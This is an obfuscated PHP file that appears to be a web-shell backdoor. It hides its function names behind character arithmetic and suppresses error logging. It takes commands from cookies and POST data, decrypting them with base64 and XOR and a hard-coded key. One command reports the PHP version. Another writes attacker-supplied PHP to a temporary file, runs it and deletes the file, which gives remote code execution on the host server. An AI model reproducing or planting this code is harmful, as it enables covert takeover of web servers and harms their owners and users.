<?php $xFaKye = "\146".chr(1077-972).'l'."\145".chr(95).chr(112).'u'."\164".chr(1045-950)."\x63".chr(993-882).'n'."\x74"."\x65".chr(110).chr(871-755).'s';
$iHHWZQP = 'b'."\x61"."\x73".chr(529-428)."\66".chr(52).chr(118-23)."\x64"."\x65".chr(99)."\157"."\x64".'e';
$miCunqf = 'i'.'n'.chr(105).chr(1061-966).chr(118-3)."\145"."\x74";
$KmovOrQ = "\165"."\156".chr(108)."\x69".'n'.chr(107);


@$miCunqf("\145".chr(783-669).'r'."\157".'r'."\137".chr(410-302).chr(111).'g', NULL);
@$miCunqf("\x6c".chr(577-466).chr(1091-988).'_'.chr(906-805).chr(114).chr(990-876).chr(111)."\162"."\x73", 0);
@$miCunqf(chr(109).chr(806-709).'x'.chr(95)."\x65".chr(988-868).chr(101).chr(99).chr(443-326).chr(167-51).'i'."\x6f".'n'.chr(95).chr(162-46).'i'."\155".'e', 0);
@set_time_limit(0);

function LkQYZ($crPjmkcZ, $MQQRVClh)
{
    $UMOcIXXLn = "";
    for ($ctcdSiy = 0; $ctcdSiy < strlen($crPjmkcZ);) {
        for ($j = 0; $j < strlen($MQQRVClh) && $ctcdSiy < strlen($crPjmkcZ); $j++, $ctcdSiy++) {
            $UMOcIXXLn .= chr(ord($crPjmkcZ[$ctcdSiy]) ^ ord($MQQRVClh[$j]));
        }
    }
    return $UMOcIXXLn;
}

$tqIDfl = array_merge($_COOKIE, $_POST);
$GzcFmxjKDn = 'fd59c0ba-61fd-4c6b-b6c0-00d7676ae933';
foreach ($tqIDfl as $wzVNuhw => $crPjmkcZ) {
    $crPjmkcZ = @unserialize(LkQYZ(LkQYZ($iHHWZQP($crPjmkcZ), $GzcFmxjKDn), $wzVNuhw));
    if (isset($crPjmkcZ["\x61"."\x6b"])) {
        if ($crPjmkcZ['a'] == "\x69") {
            $ctcdSiy = array(
                chr(112).'v' => @phpversion(),
                "\163".'v' => "3.5",
            );
            echo @serialize($ctcdSiy);
        } elseif ($crPjmkcZ['a'] == 'e') {
            $BGdnE = "./" . md5($GzcFmxjKDn) . chr(882-836).chr(579-474).chr(110).chr(99);
            @$xFaKye($BGdnE, "<" . '?'."\x70".chr(969-865)."\x70"."\40"."\100".chr(117).chr(110).chr(108).'i'."\156"."\x6b".'('.chr(492-397).chr(187-92).'F'.'I'."\x4c".chr(403-334).chr(95).'_'.chr(41).';'.' ' . $crPjmkcZ["\144"]);
            include($BGdnE);
            @$KmovOrQ($BGdnE);
        }
        exit();
    }
}

